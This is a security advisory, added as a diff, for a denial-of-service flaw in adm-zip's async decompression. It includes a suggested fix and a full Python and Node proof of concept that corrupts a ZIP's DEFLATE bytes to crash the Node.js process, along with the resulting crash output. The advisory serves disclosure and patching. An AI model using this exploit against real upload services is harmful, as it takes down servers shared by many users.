@@ -1,0 +1,387 @@
+Summary
+Denial of Service in adm-zip's async decompression API allows an unauthenticated attacker to crash the entire Node.js host process by supplying a single malformed ZIP file.
+
+Details
+Affected package: adm-zip
+Affected versions: at least 0.6.0 (current latest); likely all versions containing the current inflateAsync implementation in methods/inflater.js
+Patched version: 0.6.1
+
+Root Cause
+methods/inflater.js:12-32 (inflateAsync) creates a zlib.createInflateRaw(option) stream and feeds it attacker-controlled compressed bytes via tmp.end(inbuf), but never registers an "error" listener on the stream:
+
+inflateAsync: function (/*Function*/ callback) {
+    var tmp = zlib.createInflateRaw(option),
+        parts = [],
+        total = 0;
+    tmp.on("data", function (data) { parts.push(data); total += data.length; });
+    tmp.on("end", function () { /* build buf, callback(buf) */ });
+    tmp.end(inbuf);   // no tmp.on("error", ...) registered anywhere
+}
+Per Node.js EventEmitter/stream semantics, an "error" event emitted with zero listeners is rethrown as an uncaught exception on a later tick, originating from the zlib C++ binding. This cannot be caught by a try/catch wrapped around the calling code, because the throw happens asynchronously, outside the synchronous call stack the try/catch covers.
+
+This code path is reached from every public async API that decompresses entry data: readFileAsync, readAsTextAsync, extractAllToAsync, and ZipEntry.getDataAsync (zipEntry.js:51, :97-120, :309-315; adm-zip.js:157-164, :192-210, :893).
+
+This library recently patched CVE-2026-39244 (GHSA-xcpc-8h2w-3j85), an unbounded Buffer.alloc() on the synchronous decompression path. That fix added a maxOutputLength option to zlib.inflateRawSync/zlib.createInflateRaw, and the sync path's resulting throw is naturally catchable. The async path shares the same maxOutputLength option (methods/inflater.js:5) but has no error-handling on the stream at all, so it was not covered by that fix and remains exploitable via either of two independent triggers:
+
+A DEFLATE entry with corrupted/malformed compressed bytes (Z_DATA_ERROR) — no special crafting needed.
+Compressed data whose inflated size exceeds the declared central-directory size, which now trips the maxOutputLength guard — but on the stream this surfaces via the unhandled "error" event rather than a catchable throw.
+Attack Vector
+Attacker crafts (or corrupts) a ZIP file containing one DEFLATE-compressed entry with invalid/corrupted compressed bytes. Headers, CRC, and offsets can remain fully valid — only the compressed payload bytes need to be malformed.
+Victim application accepts this ZIP as an untrusted upload and processes it via any of adm-zip's async APIs, e.g.:
+const zip = new AdmZip(uploadedBuffer);
+zip.readFileAsync(zip.getEntries()[0], (data) => { /* ... */ });
+inflateAsync begins decompressing; zlib emits "error" on Z_DATA_ERROR.
+No listener exists for that event, so Node rethrows it as an uncaught exception, crashing the entire host process — killing all in-flight requests for every other user/tenant on that process, not just the attacker's own request.
+Impact
+Any Node.js service that accepts untrusted ZIP uploads and processes them via adm-zip's async API (the documented, recommended pattern for non-blocking servers) can be crashed by a single unauthenticated request containing one small malicious file. This is a full process-level denial of service, not a per-request error.
+
+Proof of Concept
+Attached: poc_async_dos.py. Summary of what it does:
+
+Builds a fully valid ZIP using adm-zip's own writer (new AdmZip(); zip.addFile(...); zip.toBuffer()), guaranteeing correct headers/CRC/offsets.
+Locates the local file header's compressed-data region via its own (untouched) size/offset fields and XORs every byte in that region with 0xFF, corrupting only the DEFLATE payload.
+Parses the corrupted archive with a fresh new AdmZip(badBuf) (succeeds — headers are intact) and calls entries[0].getDataAsync(callback), wrapped in try/catch, in an isolated child process.
+Captures the child's exit code and stderr.
+Verified independently 3/3 runs (plus 2 isolating controls: an unmodified zip through the same path does not crash; bare Node zlib.createInflateRaw() fed garbage with no error listener reproduces the identical crash outside adm-zip entirely, confirming the root cause is the missing listener, not something else). Representative output:
+
+[*] Child process exit code: 1
+----- Node child process stderr (crash evidence) -----
+node:events:497
+      throw er; // Unhandled 'error' event
+      ^
+Error: invalid distance too far back
+    at genericNodeError (node:internal/errors:983:15)
+    at Zlib.zlibOnError [as onerror] (node:zlib:191:17)
+Emitted 'error' event on InflateRaw instance at:
+    at emitErrorNT (node:internal/streams/destroy:170:8)
+    at emitErrorCloseNT (node:internal/streams/destroy:129:3)
+    at process.processTicksAndRejections (node:internal/process/task_queues:89:21) {
+  errno: -3,
+  code: 'Z_DATA_ERROR'
+}
+Node.js v22.22.1
+--------------------------------------
+[*] Caught by harness's own try/catch (would mean NOT vulnerable): False
+[*] getDataAsync callback ever fired (would mean NOT vulnerable): False
+[*] Child process exited non-zero (crashed): True
+[+] VULNERABILITY CONFIRMED
+Reproduction: python3 poc_async_dos.py (requires python3 and Node.js; tested on Node.js v22.22.1).
+
+Suggested Fix
+Register an "error" listener on the InflateRaw stream in methods/inflater.js's inflateAsync, and route it to the existing callback, e.g.:
+
+inflateAsync: function (/*Function*/ callback) {
+    var tmp = zlib.createInflateRaw(option),
+        parts = [],
+        total = 0;
+    tmp.on("data", function (data) { parts.push(data); total += data.length; });
+    tmp.on("error", function (err) {
+        // surface as a normal async error instead of crashing the process
+        callback(Buffer.alloc(0), err);   // or however this codebase's async
+                                            // error convention is expressed
+    });
+    tmp.on("end", function () { /* existing behavior */ });
+    tmp.end(inbuf);
+}
+The exact callback/error-propagation convention should match the rest of the codebase's async error handling style (a quick look suggests callbacks here are currently success-only; this may need a small signature adjustment or an err-first convention, at the maintainer's discretion). The key fix is simply: never leave a Node.js stream without an "error" listener when it can plausibly error on attacker-controlled input.
+
+Full PoC Source (poc_async_dos.py)
+#!/usr/bin/env python3
+"""
+Tested version: adm-zip 0.6.0
+Tested on: Linux, Node.js v22.22.1
+
+Description:
+  methods/inflater.js:12-32 (inflateAsync) creates a
+  zlib.createInflateRaw(option) stream and calls tmp.end(inbuf) without ever
+  registering an "error" listener on the stream. Per Node.js EventEmitter
+  semantics, an "error" event emitted with zero listeners is rethrown as an
+  uncaught exception -- this happens on a later tick from the zlib C++
+  binding, so it CANNOT be caught by a try/catch wrapped around the calling
+  code. Any code that feeds an untrusted zip file into one of adm-zip's
+  public *Async APIs (readFileAsync, readAsTextAsync, extractAllToAsync,
+  ZipEntry.getDataAsync) crashes the entire host Node.js process the moment
+  it encounters a DEFLATE entry with corrupted/malformed compressed bytes.
+  The synchronous decompression path (getData()) was hardened for
+  CVE-2026-39244 (maxOutputLength + a throw that is naturally catchable);
+  this async streaming path was missed by that fix and remains an
+  unauthenticated, single-request availability bug.
+
+Impact:
+  Any service that accepts untrusted zip uploads and reads/extracts them
+  via adm-zip's async API (the officially documented, recommended usage
+  for non-blocking servers) can be crashed by a single malicious zip file,
+  with no authentication and no special privileges required.
+
+Reproduction:
+  1. Install: this PoC runs directly against the adm-zip source tree this
+     script lives alongside (no `npm install` needed -- it requires the
+     local checkout via its package.json "main" entry, adm-zip.js).
+     Requires: python3, node (tested with Node.js v22.22.1).
+  2. Run: python3 poc_async_dos.py
+  3. Observe: the spawned Node child process exits non-zero with an
+     "Unhandled 'error' event" / Z_DATA_ERROR stack trace on stderr,
+     originating from methods/inflater.js's zlib.createInflateRaw stream.
+     Neither the harness's try/catch nor the getDataAsync callback ever
+     fires -- proving the crash is unrecoverable from calling code.
+
+How the malicious zip is built (see the embedded Node harness in
+build_harness_script() below):
+  1. Use adm-zip's own writer (`new AdmZip(); zip.addFile(...); zip.toBuffer()`)
+     to produce a fully valid, well-formed zip archive with one DEFLATE
+     entry. This guarantees every header/CRC/offset field is structurally
+     correct.
+  2. Locate the local file header at offset 0 and compute the compressed
+     data region from the (untouched) LOCSIZ/LOCNAM/LOCEXT fields.
+  3. XOR every byte in that region with 0xFF, corrupting ONLY the DEFLATE
+     payload while leaving every size/offset/CRC field in the local header,
+     central directory, and EOCD record byte-for-byte unchanged, so
+     adm-zip's own parser still locates and slices exactly the right
+     region and reaches the vulnerable inflateAsync() call.
+"""
+
+import os
+import subprocess
+import sys
+import tempfile
+
+# ============================================================
+# Configuration
+# ============================================================
+PACKAGE_NAME = "adm-zip"
+TARGET_VERSION = "0.6.0"
+# The adm-zip source tree this PoC lives alongside (Hunter's checkout).
+REPO_DIR = os.path.dirname(os.path.abspath(__file__))
+NODE_BIN = "node"
+SUBPROCESS_TIMEOUT_SECONDS = 20
+
+
+# ============================================================
+# Node.js harness (the genuine trigger -- adm-zip is a JS library, so the
+# actual exploit code must run under Node; this Python script builds it,
+# runs it in an isolated child process, and interprets the result).
+# ============================================================
+def build_harness_script(repo_dir: str) -> str:
+    return r"""
+"use strict";
+const AdmZip = require(%(repo_dir)r);
+
+console.log("HARNESS_START");
+
+// Step 1: build a legitimate zip in memory using adm-zip's OWN writer, with
+// one DEFLATE-compressed entry. Repetitive text compresses well and
+// guarantees the DEFLATED method is chosen (not STORED).
+const zip = new AdmZip();
+const payload = Buffer.from(
+    "The quick brown fox jumps over the lazy dog. ".repeat(200),
+    "utf8"
+);
+zip.addFile("payload.txt", payload, "");
+const goodBuf = zip.toBuffer();
+console.log("BUILT_GOOD_ZIP bytes=" + goodBuf.length);
+
+// Step 2: locate the local file header (offset 0 in this single-entry
+// archive) and corrupt ONLY the compressed-data bytes in place, leaving
+// every size/offset/CRC field in the local header, central directory, and
+// EOCD record untouched -- so adm-zip's own parser still finds and slices
+// exactly the right region and reaches the vulnerable inflateAsync() path.
+const LOCSIG = 0x04034b50;
+if (goodBuf.readUInt32LE(0) !== LOCSIG) {
+    throw new Error("unexpected local header signature -- adm-zip writer output changed");
+}
+const compressedSize = goodBuf.readUInt32LE(18); // LOCSIZ
+const fileNameLen = goodBuf.readUInt16LE(26); // LOCNAM
+const extraLen = goodBuf.readUInt16LE(28); // LOCEXT
+const dataStart = 30 + fileNameLen + extraLen;
+const dataEnd = dataStart + compressedSize;
+console.log(
+    "LOCAL_HEADER compressedSize=" + compressedSize +
+    " dataStart=" + dataStart + " dataEnd=" + dataEnd
+);
+
+const badBuf = Buffer.from(goodBuf); // copy, do not mutate original
+for (let i = dataStart; i < dataEnd; i++) {
+    badBuf[i] = badBuf[i] ^ 0xff; // corrupt every byte of the DEFLATE stream
+}
+console.log("CORRUPTED_COMPRESSED_BYTES count=" + (dataEnd - dataStart));
+
+// Step 3: parse the corrupted archive (this succeeds -- headers are intact)
+// and hit the vulnerable async decompression path.
+const zip2 = new AdmZip(badBuf);
+const entries = zip2.getEntries();
+console.log(
+    "PARSED_CORRUPT_ZIP entries=" + entries.length +
+    " name=" + entries[0].entryName
+);
+
+try {
+    // This is the public, documented API a real server would call on an
+    // untrusted upload (readFileAsync / getDataAsync / extractAllToAsync
+    // all funnel into the same decompress(true, ...) -> inflateAsync path).
+    entries[0].getDataAsync(function (data, err) {
+        // If this ever fires, the library handled the error gracefully
+        // (no crash) -- meaning the vulnerability is NOT present / already
+        // fixed in this build.
+        console.log(
+            "CALLBACK_FIRED data_len=" + (data ? data.length : 0) +
+            " err=" + err
+        );
+    });
+    console.log("SYNC_CALL_RETURNED_NO_THROW");
+} catch (e) {
+    // If this ever fires, the bug is NOT present -- the error would be
+    // synchronously catchable by ordinary calling code.
+    console.log("CAUGHT_BY_TRY_CATCH: " + e.message);
+}
+
+console.log("HARNESS_END_OF_SYNCHRONOUS_CODE");
+// Deliberately NOT registering process.on("uncaughtException", ...) here --
+// doing so would mask the exact bug under test. A real, unmodified server
+// process has no reason to install a blanket uncaughtException handler
+// either; that is precisely what makes this an unrecoverable process crash.
+""" % {"repo_dir": repo_dir}
+
+
+# ============================================================
+# Step 1: Setup
+# ============================================================
+def setup():
+    """Verify prerequisites and write out the Node.js harness script."""
+    print(f"[*] Setting up PoC for {PACKAGE_NAME}@{TARGET_VERSION}")
+    print(f"[*] Target adm-zip source tree: {REPO_DIR}")
+
+    main_entry = os.path.join(REPO_DIR, "adm-zip.js")
+    if not os.path.isfile(main_entry):
+        print(f"[-] Cannot find adm-zip.js at {main_entry}")
+        sys.exit(1)
+
+    try:
+        node_version = subprocess.run(
+            [NODE_BIN, "--version"], capture_output=True, text=True, timeout=10
+        )
+        print(f"[*] Found Node.js: {node_version.stdout.strip()}")
+    except FileNotFoundError:
+        print("[-] node binary not found on PATH -- required to run this PoC")
+        sys.exit(1)
+
+    handle, harness_path = tempfile.mkstemp(prefix="admzip_async_dos_", suffix=".js")
+    with os.fdopen(handle, "w") as f:
+        f.write(build_harness_script(REPO_DIR))
+    print(f"[*] Wrote Node harness to {harness_path}")
+    return harness_path
+
+
+# ============================================================
+# Step 2: Trigger the vulnerability
+# ============================================================
+def trigger(harness_path):
+    """Run the Node harness (in its own isolated child process) that builds
+    the malicious zip and feeds it into adm-zip's vulnerable async API."""
+    print("[*] Triggering vulnerability (spawning isolated Node subprocess)...")
+    try:
+        proc = subprocess.run(
+            [NODE_BIN, harness_path],
+            capture_output=True,
+            text=True,
+            timeout=SUBPROCESS_TIMEOUT_SECONDS,
+            cwd=REPO_DIR,
+        )
+        return {
+            "timed_out": False,
+            "returncode": proc.returncode,
+            "stdout": proc.stdout,
+            "stderr": proc.stderr,
+        }
+    except subprocess.TimeoutExpired as e:
+        return {
+            "timed_out": True,
+            "returncode": None,
+            "stdout": (e.stdout or b"").decode(errors="replace") if isinstance(e.stdout, bytes) else (e.stdout or ""),
+            "stderr": (e.stderr or b"").decode(errors="replace") if isinstance(e.stderr, bytes) else (e.stderr or ""),
+        }
+
+
+# ============================================================
+# Step 3: Verify impact
+# ============================================================
+def verify(result):
+    """Check that the child process crashed with an unhandled 'error' event
+    originating from the async inflater, and that neither the try/catch nor
+    the getDataAsync callback in the harness ever ran."""
+    print("[*] Verifying impact...")
+    print(f"[*] Child process exit code: {result['returncode']}")
+    print()
+    print("----- Node child process stdout -----")
+    print(result["stdout"].rstrip())
+    print("----- Node child process stderr (crash evidence) -----")
+    print(result["stderr"].rstrip())
+    print("--------------------------------------")
+    print()
+
+    if result["timed_out"]:
+        print("[-] Harness timed out instead of crashing -- inconclusive")
+        return False
+
+    stdout = result["stdout"]
+    stderr = result["stderr"]
+    returncode = result["returncode"]
+
+    reached_vuln_call = "SYNC_CALL_RETURNED_NO_THROW" in stdout
+    was_caught = "CAUGHT_BY_TRY_CATCH" in stdout
+    callback_fired = "CALLBACK_FIRED" in stdout
+    process_crashed = returncode is not None and returncode != 0
+    unhandled_error_evidence = (
+        "Unhandled 'error' event" in stderr
+        or "ERR_UNHANDLED_ERROR" in stderr
+        or "Emitted 'error' event on InflateRaw instance" in stderr
+    )
+
+    print(f"[*] Reached vulnerable getDataAsync() call without throwing: {reached_vuln_call}")
+    print(f"[*] Caught by harness's own try/catch (would mean NOT vulnerable): {was_caught}")
+    print(f"[*] getDataAsync callback ever fired (would mean NOT vulnerable): {callback_fired}")
+    print(f"[*] Child process exited non-zero (crashed): {process_crashed}")
+    print(f"[*] stderr shows an unhandled 'error' event from the InflateRaw stream: {unhandled_error_evidence}")
+
+    success = (
+        reached_vuln_call
+        and not was_caught
+        and not callback_fired
+        and process_crashed
+        and unhandled_error_evidence
+    )
+    return success
+
+
+# ============================================================
+# Main
+# ============================================================
+if __name__ == "__main__":
+    print(f"=== CVE-CANDIDATE: {PACKAGE_NAME} async decompression DoS ===")
+    print(f"[*] Target version: {TARGET_VERSION}")
+    print()
+
+    harness_path = setup()
+    try:
+        result = trigger(harness_path)
+        success = verify(result)
+    finally:
+        try:
+            os.remove(harness_path)
+            print(f"[*] Cleaned up temp harness file: {harness_path}")
+        except OSError:
+            pass
+
+    print()
+    if success:
+        print("[+] VULNERABILITY CONFIRMED")
+        print(
+            "[+] Impact: a single untrusted zip file with a corrupted DEFLATE "
+            "entry crashes the entire Node.js process when read via any "
+            "adm-zip *Async API (readFileAsync / readAsTextAsync / "
+            "extractAllToAsync / ZipEntry.getDataAsync). Unauthenticated, "
+            "single-request, unrecoverable process-level Denial of Service."
+        )
+    else:
+        print("[-] Vulnerability NOT confirmed")
+
+    sys.exit(0 if success else 1)
